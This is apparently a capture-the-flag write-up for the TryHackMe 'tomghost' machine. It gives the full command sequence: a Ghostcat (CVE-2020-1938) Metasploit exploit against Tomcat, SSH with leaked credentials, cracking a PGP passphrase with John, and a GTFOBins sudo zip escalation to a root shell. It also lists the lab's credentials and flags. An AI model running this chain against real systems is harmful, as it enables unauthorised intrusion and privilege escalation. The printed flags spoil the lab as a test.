# tomghost - Easy

```shell
nmap -T4 -p- -A -v 10.10.186.74

msfconsole -q

search CVE-2020-1938
#ghostcat

use auxiliary/admin/http/tomcat_ghostcat

options

set RHOSTS 10.10.186.74

run

#use creds from exploit
ssh skyfuck@10.10.186.74

ls -la

#in attacker machine
scp -r skyfuck@10.10.186.74:/home/skyfuck/tryhackme.asc /home/sv/

gpg2john tryhackme.asc > asc_hash

john --wordlist=/usr/share/wordlists/rockyou.txt asc_hash
#we get passphrase

gpg --import tryhackme.asc

gpg --decrypt credential.pgp
#gives SSH creds for merlin

ssh merlin@10.10.186.74

sudo -l
#we can run zip as root

#GTFObins exploit
TF=$(mktemp -u)

sudo /usr/bin/zip $TF /etc/hosts -T -TT 'sh #'
#we get root shell
```

* Open ports & services:

  * 22 - ssh - OpenSSH 7.2p2 (Ubuntu)
  * 53 - tcpwrapped
  * 8009 - ajp13 - Apache Jserv (Protocol v1.3)
  * 8080 - http - Apache Tomcat 9.0.30

* Checking the webpage on port 8080, we can confirm that it is using Apache Tomcat/9.0.30

* We can search for exploits related to this version on ExploitDB and Metasploit.

* For 9.0.30, we have the ghostcat exploit, and it is available in Metasploit as well.

* Now, this exploit allows us to read files which we do not have access to, and in this case, the filename by default is /WEB-INF/web.xml

* When we run the exploit, we get the contents of this file; it contains the creds skyfuck:8730281lkjlkjdqlksalks

* We can use this creds to log into SSH; user flag can be found in merlin's home directory.

* We have two files - credential.pgp and tryhackme.asc - transfer both files to attacker machine.

* We can use gpg2john to crack the .asc file; we get the passphrase 'alexandru'

* With the help of this passphrase, we can import key and decrypt the pgp file to get the creds merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j

* Logging into SSH as merlin, we can check sudo permissions; zip binary can be run as root.

* Using the exploit from GTFObins, we can misuse this and get root shell.

```markdown
1. Compromise this machine and obtain user.txt - THM{GhostCat_1s_so_cr4sy}

2. Escalate privileges and obtain root.txt - THM{Z1P_1S_FAKE}
```
